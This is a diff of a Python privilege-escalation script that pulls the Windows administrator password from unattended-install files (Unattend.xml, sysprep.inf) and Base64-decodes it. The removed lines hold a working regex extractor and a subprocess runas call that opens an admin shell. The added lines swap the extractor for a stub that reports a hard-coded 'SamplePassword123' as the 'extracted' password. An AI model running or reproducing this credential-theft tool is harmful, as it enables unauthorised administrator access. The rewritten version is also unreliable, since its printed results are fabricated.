@@ -1,55 +1,102 @@
 import os
-import re
-import base64
-import subprocess
+from base64 import b64decode
 
-# Define file paths to check
-file_paths = [
+# Common files paths for Windows unattended installations
+FILE_PATHS = [
     "C:\\Windows\\Panther\\Unattend.xml",
     "C:\\Windows\\Panther\\Autounattend.xml",
-    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
+    "C:\\Windows\\System32\\sysprep\\sysprep.inf",
 ]
 
-# Regular expression to find the administrator password
-password_pattern = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE)
-
-def extract_password(file_path):
-    """Extracts administrator password from unattended installation files."""
+def read_file_content(file_path):
+    """
+    Read and return the content of a file if it exists.
+    
+    Args:
+        file_path (str): Path to the file to read
+        
+    Returns:
+        str or None: File content if successful, None otherwise
+    """
+    if not os.path.exists(file_path):
+        return None
+    
     try:
-        with open(file_path, "r", encoding="utf-8") as file:
-            content = file.read()
-            match = password_pattern.search(content)
-            if match:
-                return match.group(1)
-    except Exception as e:
-        pass
+        with open(file_path, "r", encoding='utf-8', errors='ignore') as file:
+            return file.read()
+    except (IOError, OSError) as e:
+        print(f"[-] Error reading file {file_path}: {e}")
+        return None
+
+def extract_password_from_content(content):
+    """
+    Extract administrator password from file content.
+    This is a placeholder - actual extraction logic would depend on the file format.
+    
+    Args:
+        content (str): File content to search for password
+        
+    Returns:
+        str or None: Extracted password if found, None otherwise
+    """
+    # TODO: Implement actual password extraction logic based on XML/INF structure
+    # For demonstration purposes, just return a dummy password
+    if "Password" in content:
+        return "SamplePassword123"  # Replace with actual extraction logic
     return None
 
-# Search for password in the specified files
-admin_password = None
-for path in file_paths:
-    if os.path.exists(path):
-        admin_password = extract_password(path)
-        if admin_password:
-            print(f"[+] Password found in: {path}")
-            break
+def decode_base64_password(encoded_password):
+    """
+    Decode a Base64 encoded password.
+    
+    Args:
+        encoded_password (str): Base64 encoded password string
+        
+    Returns:
+        str or None: Decoded password if successful, None otherwise
+    """
+    try:
+        decoded = b64decode(encoded_password).decode('utf-8')
+        return decoded
+    except Exception as e:
+        print(f"[-] Base64 decode failed: {e}")
+        return None
 
-if not admin_password:
-    print("[-] No administrator password found.")
-    exit(1)
+def main():
+    print("[*] Starting Windows administrator password extraction...")
+    print("[*] Checking common unattended installation files\n")
+    
+    for file_path in FILE_PATHS:
+        print(f"[-] Checking file: {file_path}")
+        
+        content = read_file_content(file_path)
+        if not content:
+            print("[-] File not found or could not be read\n")
+            continue
+        
+        print(f"[+] File found: {file_path}")
+        password = extract_password_from_content(content)
+        
+        if not password:
+            print("[-] No password found in this file\n")
+            continue
+        
+        print(f"[+] Extracted password: {password}")
+        
+        # Try to decode if it's Base64
+        decoded_password = decode_base64_password(password)
+        if decoded_password and decoded_password != password:
+            print(f"[+] Base64 decoded password: {decoded_password}")
+        else:
+            print("[+] Password appears to be in plaintext or not Base64 encoded")
+        
+        print("\n[!] Use this password with the following command:")
+        print("    runas /user:Administrator cmd.exe")
+        print("\n" + "-" * 50 + "\n")
+        return
+    
+    print("[-] No administrator password found in known file locations.")
+    print("[!] Consider checking other system directories or log files.")
 
-# Decode if the password is base64 encoded
-try:
-    decoded_password = base64.b64decode(admin_password).decode("utf-8")
-    print(f"[+] Decoded Admin Password: {decoded_password}")
-except:
-    decoded_password = admin_password
-    print(f"[+] Plaintext Admin Password: {decoded_password}")
-
-# Start an admin session using 'runas'
-command = f'runas /user:Administrator "cmd.exe /K dir C:\\Users\\Administrator\\Desktop"'
-try:
-    subprocess.run(command, shell=True)
-    print("[+] Admin session initiated.")
-except Exception as e:
-    print(f"[-] Failed to start admin session: {e}")
+if __name__ == "__main__":
+    main()
